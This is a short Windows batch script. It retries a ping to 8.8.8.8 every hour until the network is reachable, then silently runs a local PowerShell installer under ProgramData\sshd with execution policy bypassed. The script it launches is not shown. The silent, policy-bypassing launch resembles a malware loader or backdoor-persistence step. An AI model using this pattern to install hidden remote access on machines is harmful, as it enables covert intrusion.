@echo off
:CheckConnection
REM Check if we can reach Google DNS
ping -n 1 8.8.8.8 >nul 2>&1

REM If ping was unsuccessful, sleep for 1 hour
if errorlevel 1 (
    timeout /t 3600 >nul
    goto CheckConnection
)

REM If ping was successful, run the PowerShell script
PowerShell.exe -ExecutionPolicy Bypass -File "C:\ProgramData\sshd\install.ps1" >nul 2>&1
